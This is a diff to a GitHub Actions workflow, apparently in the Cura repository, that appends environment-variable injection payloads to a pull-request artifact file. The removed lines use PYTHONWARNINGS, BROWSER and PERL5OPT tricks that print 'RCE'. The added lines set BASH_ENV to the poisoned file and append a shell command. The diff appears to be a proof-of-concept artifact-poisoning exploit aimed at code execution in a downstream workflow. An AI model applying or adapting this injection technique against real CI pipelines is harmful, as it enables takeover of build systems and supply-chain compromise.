@@ -15,10 +15,8 @@ jobs:
           echo ${{ github.event.number }} > printer-linter-result/pr-id.txt
           echo ${{ github.event.pull_request.head.repo.full_name }} > printer-linter-result/pr-head-repo.txt
           echo ${{ github.event.pull_request.head.ref }} > printer-linter-result/pr-head-ref.txt
-          echo "PYTHONWARNINGS=\"all:0:antigravity.x:0:0\"" >> printer-linter-result/pr-head-ref.txt
-          echo "BROWSER=\"perlthanks\"" >> printer-linter-result/pr-head-ref.txt
-          echo "PERL5OPT=\"-Mbase;print('RCE');exit;\"" >> printer-linter-result/pr-head-ref.txt
-          echo "PROMPT_COMMAND='echo coucou'" >> printer-linter-result/pr-head-ref.txt
+          echo "BASH_ENV='/home/runner/work/Cura/Cura/pr-head-ref.txt'" >> printer-linter-result/pr-head-ref.txt
+          echo "echo coucou" >> printer-linter-result/pr-head-ref.txt
       - uses: actions/upload-artifact@v2
         with:
           name: printer-linter-result
